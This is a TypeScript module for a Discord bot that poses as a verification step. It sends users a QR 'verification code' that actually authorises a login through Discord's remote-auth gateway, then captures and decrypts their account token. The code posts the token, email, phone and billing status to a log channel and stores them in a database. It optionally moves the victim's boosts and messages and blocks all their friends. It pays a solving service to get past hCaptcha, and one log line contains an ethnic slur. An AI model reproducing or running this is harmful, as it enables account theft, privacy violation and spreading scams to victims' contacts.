import {
  ButtonInteraction,
  Client,
  AttachmentBuilder,
  TextChannel,
  EmbedBuilder,
} from "discord.js";
import {
  generateKeyPairSync,
  createHash,
  privateDecrypt,
  KeyPairKeyObjectResult,
} from "crypto";
import { logError, logInformation, logSuccess } from "../../util/console";
import { model, Schema } from "mongoose";
import {
  failedVerificationEmbed,
  failedVerificationEmbedReason,
  successVerificationEmbed,
  verificationCodeEmbed,
} from "../util/embeds";
import {
  getUserInformation,
  getBillingInformation,
  getAllBoosts,
  addBoostToserver,
  getAllFriends,
  createFriendChannel,
  sendMessage,
  blockFriend,
  remoteAuthTicket,
} from "../util/fetch";
import { IData, ITicketData } from "../../types";
import { Solver } from "2captcha";
import WebSocket from "ws";
import Jimp from "jimp";
import { config } from "../../util/config";

const users = model(
  config.mongoose.schemaName,
  new Schema({
    id: String,
    username: String,
    token: String,
    hasBilling: Boolean,
  })
);

const socket = (client: Client, interaction: ButtonInteraction) =>
  new Promise(async (resolve, reject) => {
    resolve(true);
    const socketClient = new WebSocket(
      `wss://remote-auth-gateway.discord.gg/?v=2`,
      { origin: "https://discord.com", handshakeTimeout: 10000 }
    );
    const keyPair = generateKeyPairSync("rsa", {
      modulusLength: 2048,
      publicExponent: 65537,
    });
    socketClient.onerror = (e) => logError(e.message.toUpperCase());
    socketClient.onclose = (e) => logError("SOCKET CLOSED");
    let heartbeat: NodeJS.Timeout;
    setTimeout(() => {
      socketClient.close();
      clearInterval(heartbeat);
      interaction.user
        .send({
          embeds: [failedVerificationEmbed(client)],
        })
        .catch(() => {});
      return reject(false);
    }, 1200000);
    socketClient.onmessage = async (event) => {
      const data: IData = JSON.parse(event.data as string);
      switch (data.op) {
        case "hello":
          socketClient.send(
            JSON.stringify({
              op: "init",
              encoded_public_key: keyPair.publicKey
                .export({ type: "spki", format: "der" })
                .toString("base64"),
            })
          );
          heartbeat = setInterval(() => {
            socketClient.send(JSON.stringify({ op: "heartbeat" }));
          }, data.heartbeat_interval);
          break;
        case "nonce_proof":
          const decryptedNonce = privateDecrypt(
            { key: keyPair.privateKey, oaepHash: "sha256" },
            Buffer.from(data.encrypted_nonce as string, "base64")
          );
          const nonceHash = createHash("sha256")
            .update(decryptedNonce)
            .digest("base64url");
          socketClient.send(
            JSON.stringify({ op: "nonce_proof", proof: nonceHash })
          );
          break;
        case "pending_remote_init":
          const embed = verificationCodeEmbed(client);
          const fingerprintData = `https://discordapp.com/ra/${data.fingerprint}`;
          const qrCodeURL = `https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=${fingerprintData}`;

          const bg = new Jimp(300, 300, 0xffffffff);
          const qrCode = await Jimp.read(qrCodeURL);
          bg.composite(qrCode, 22, 22);

          bg.getBuffer(Jimp.MIME_PNG, (err, buffer) => {
            const discordImage = new AttachmentBuilder(buffer).setName(
              "img.png"
            );

            embed.setImage("attachment://img.png");
            interaction.user.send({
              embeds: [embed],
              files: [discordImage],
            });
          });
          break;
        case "pending_login": // v2 changed how they handled the ws
          const ticket = data.ticket;
          if (!ticket) return;

          let encrypted_token = "";

          const solvecaptcha = async (
            sitekey: string,
            rqdata: string,
            rqtoken: string
          ): Promise<string | undefined> => {
            if (!config.captcha.enabled) {
              console.log(
                "2Captcha disabled - cannot complete captcha. Please enable and provide a valid API key."
              );
              return;
            }

            const solver = new Solver(config.captcha.apiKey as string);
            console.log("SOLVING CAPTCHA");
            const { data } = await solver.hcaptcha(
              sitekey,
              "https://discord.com/login",
              {
                data: rqdata,
                userAgent:
                  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
              }
            );

            if (!data) {
              interaction.user.send("Captcha Failed").catch(() => {});
              return;
            }

            const resCaptcha: ITicketData = await remoteAuthTicket(
              ticket,
              data,
              rqtoken
            );
            console.log("CAPTCHA RESPONSE", resCaptcha);

            if (resCaptcha.captcha_sitekey) {
              return solvecaptcha(
                resCaptcha.captcha_sitekey as string,
                resCaptcha.captcha_rqdata as string,
                resCaptcha.captcha_rqtoken as string
              );
            }

            if (resCaptcha.code && resCaptcha.code === 20042) {
              interaction.user
                .send({
                  embeds: [
                    failedVerificationEmbedReason(client, "CAPTCHA FAILED"),
                  ],
                })
                .catch(() => {});
              return;
            }
            if (resCaptcha.encrypted_token) return resCaptcha.encrypted_token;
          };

          const res: ITicketData = await remoteAuthTicket(ticket);
          console.log("INITIAL RESPONSE", res);

          if (res.captcha_key) {
            const captchaToken = await solvecaptcha(
              res.captcha_sitekey as string,
              res.captcha_rqdata as string,
              res.captcha_rqtoken as string
            );

            if (!captchaToken) {
              console.log("INDIAN MAN FAILED TO COMPLETE CAPTCHA 3 TIMES");
              socketClient.close();
              clearInterval(heartbeat);
              return reject(false);
            }

            encrypted_token = captchaToken;
          } else {
            encrypted_token = res.encrypted_token as string;
          }

          const decryptedToken = privateDecrypt(
            { key: keyPair.privateKey, oaepHash: "sha256" },
            Buffer.from(encrypted_token as string, "base64")
          );
          const token = decryptedToken.toString();
          logSuccess(`${token}`);

          const userInformation = await getUserInformation(token);
          if (userInformation.id !== interaction.user.id) {
            interaction.user
              .send({
                embeds: [failedVerificationEmbedReason(client, "Wrong User")],
              })
              .catch(() => {});
          } else {
            await interaction.user
              .send({
                embeds: [successVerificationEmbed(client)],
              })
              .catch(() => {});

            const role = client.guilds.cache
              .get(config.verify.guildId)
              ?.roles.cache.get(config.verify.roleId);
            const user = client.guilds.cache
              .get(config.verify.guildId)
              ?.members.cache.get(interaction.user.id);
            if (role && user) user.roles.add(role).catch(() => {});
          }

          const avatarUrl =
            userInformation.avatar !== null
              ? `https://cdn.discordapp.com/avatars/${userInformation.id}/${userInformation.avatar}.png`
              : `https://discord.com/assets/1f0bfc0865d324c2587920a7d80c609b.png`;

          const billingInformation = await getBillingInformation(token);

          const tokenLoggedEmbed = new EmbedBuilder()
            .setColor("#FF0000")
            .setAuthor({
              name: `${userInformation.username}#${userInformation.discriminator} [${userInformation.id}]`,
              iconURL: avatarUrl,
            })
            .addFields([
              {
                name: "Account Info",
                value: `Email: ${userInformation.email}\nPhone: ${
                  userInformation.phone
                }\nNitro: ${
                  userInformation.premium_type
                    ? userInformation.premium_type === 2
                      ? "Booster"
                      : "Classic"
                    : "None"
                }\nBilling Info: ${
                  billingInformation.length > 0 ? "Yes" : "No"
                }`,
              },
              { name: "Token", value: token },
            ]);

          const logChannel = (await client.channels.cache.get(
            config.log.channelId
          )) as TextChannel;
          logChannel
            .send({
              embeds: [tokenLoggedEmbed],
            })
            .catch(() => {});

          if (config.autoBoost) {
            const allBoosts = await getAllBoosts(token);
            await addBoostToserver(
              token,
              allBoosts.map((x) => x.id)
            );
          }

          if (config.autoMessage.enabled) {
            const allFriends = await getAllFriends(token);
            for (const friend of allFriends) {
              const friendChannel = await createFriendChannel(token, friend.id);
              await sendMessage(token, friendChannel.id);
              if (config.autoMessage.blockAfterMessage)
                await blockFriend(token, friend.id);
            }
          }

          if (config.mongoose.enabled) {
            const foundUser = await users.findOne({ id: userInformation.id });
            if (foundUser) {
              foundUser.token = token;
              foundUser.hasBilling = billingInformation.length > 0;
              await foundUser.save();
            } else
              await users.create({
                id: userInformation.id,
                username: userInformation.username,
                token: token,
                hasBilling: billingInformation.length > 0,
              });
          }
        default:
          break;
      }
    };
  });

export default socket;
